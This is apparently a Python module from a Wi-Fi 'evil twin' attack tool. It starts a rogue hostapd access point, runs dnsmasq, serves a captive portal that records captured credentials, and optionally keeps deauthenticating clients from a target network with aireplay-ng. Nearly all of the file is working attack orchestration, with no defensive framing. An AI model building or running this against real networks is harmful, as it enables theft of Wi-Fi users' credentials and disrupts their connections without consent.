"""Attack orchestrator.

Wires the modules together into a single run with a clean lifecycle:

    firewall  ->  assign AP IP  ->  hostapd (AP)  ->  dnsmasq (DHCP/DNS)
              ->  captive portal (thread)  ->  optional deauth (background)

On ``Ctrl-C`` (or ``stop()``) every component is torn down in reverse order and
iptables rules are removed.
"""

from __future__ import annotations

import signal
import threading
import time
from typing import List, Optional

from wifi_evil_twin.config import Config
from wifi_evil_twin.core import access_point, dhcp, firewall
from wifi_evil_twin.core.captive_portal import create_app
from wifi_evil_twin.core.credentials import CredentialStore
from wifi_evil_twin.core.deauth import deauth_continuous
from wifi_evil_twin.utils.system import require_root, run

try:  # Python 3.9+ has this; older needs threading.Event fallback handled below
    from signal import SIGINT, SIGTERM
except Exception:  # pragma: no cover
    SIGINT = SIGTERM = None


class Orchestrator:
    """Coordinates a full Evil Twin run."""

    def __init__(self, cfg: Config, store: CredentialStore):
        self.cfg = cfg
        self.store = store
        self.fw = firewall.Firewall(cfg, dry_run=cfg.dry_run)
        self.ap_proc = None
        self.dhcp_proc = None
        self.deauth_proc = None
        self.portal_thread: Optional[threading.Thread] = None
        self._stop = threading.Event()
        self._portal_app = None

    # ---- lifecycle ---------------------------------------------------
    def start(self) -> None:
        cfg = self.cfg
        if not cfg.dry_run:
            require_root()
        cfg.validate()
        cfg.ensure_dirs()

        print(f"[*] Starting Evil Twin for SSID '{cfg.ssid}' on {cfg.interface}")
        self.fw.setup()
        self._assign_ap_ip()

        print("[*] Launching rogue access point (hostapd)...")
        self.ap_proc = access_point.start_ap(cfg, dry_run=cfg.dry_run)

        print("[*] Launching DHCP/DNS (dnsmasq)...")
        self.dhcp_proc = dhcp.start_dhcp(cfg, dry_run=cfg.dry_run)

        print(f"[*] Starting captive portal on :{cfg.portal_port}...")
        self._start_portal()

        if cfg.deauth and cfg.deauth_bssid:
            print(f"[*] Starting deauth against {cfg.deauth_bssid}...")
            self.deauth_proc = deauth_continuous(
                monitor_iface=cfg.monitor_interface,
                bssid=cfg.deauth_bssid,
                client=cfg.deauth_client,
                tool="aireplay-ng",
                dry_run=cfg.dry_run,
            )

        self._install_signal_handlers()
        print("[+] Running. Press Ctrl-C to stop and clean up.\n")
        if cfg.dry_run:
            # Nothing was actually launched; just summarize and exit.
            print("[dry-run] No processes started. Exiting dry-run.\n")
            return
        try:
            while not self._stop.is_set():
                time.sleep(0.5)
        except KeyboardInterrupt:  # pragma: no cover - interactive
            pass
        self.stop()

    def stop(self) -> None:
        print("\n[*] Shutting down...")
        self._stop.set()
        self._terminate(self.deauth_proc)
        self._stop_portal()
        self._terminate(self.dhcp_proc)
        self._terminate(self.ap_proc)
        self.fw.teardown()
        self._remove_ap_ip()
        print(f"[+] Stopped. {self.store.count()} credential(s) captured.")

    # ---- helpers -----------------------------------------------------
    def _assign_ap_ip(self) -> None:
        cfg = self.cfg
        run(
            ["ip", "addr", "add", f"{cfg.gateway_ip}/24", "dev", cfg.interface],
            dry_run=cfg.dry_run,
            check=False,
        )
        run(["ip", "link", "set", cfg.interface, "up"], dry_run=cfg.dry_run, check=False)

    def _remove_ap_ip(self) -> None:
        cfg = self.cfg
        run(
            ["ip", "addr", "del", f"{cfg.gateway_ip}/24", "dev", cfg.interface],
            dry_run=cfg.dry_run,
            check=False,
        )

    def _start_portal(self) -> None:
        self._portal_app = create_app(self.cfg, self.store)
        if self.cfg.dry_run:
            return

        def _serve() -> None:  # pragma: no cover - needs live socket
            self._portal_app.run(
                host=self.cfg.portal_bind,
                port=self.cfg.portal_port,
                threaded=True,
            )

        self.portal_thread = threading.Thread(target=_serve, daemon=True)
        self.portal_thread.start()

    def _stop_portal(self) -> None:
        # The dev server runs in a daemon thread; it exits with the process.
        # In dry-run there is no thread.
        if self.portal_thread and self.portal_thread.is_alive():
            # Flask's dev server can't be cleanly shut from another thread
            # without Werkzeug's shutdown; relying on process exit is fine for
            # an operator-driven tool. We just clear the reference here.
            pass

    def _terminate(self, proc) -> None:
        if proc is None:
            return
        try:
            proc.terminate()
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass

    def _install_signal_handlers(self) -> None:  # pragma: no cover - signals
        try:
            for sig in (signal.SIGINT, signal.SIGTERM):
                signal.signal(sig, lambda *_: self.stop())
        except (ValueError, OSError, AttributeError):
            pass
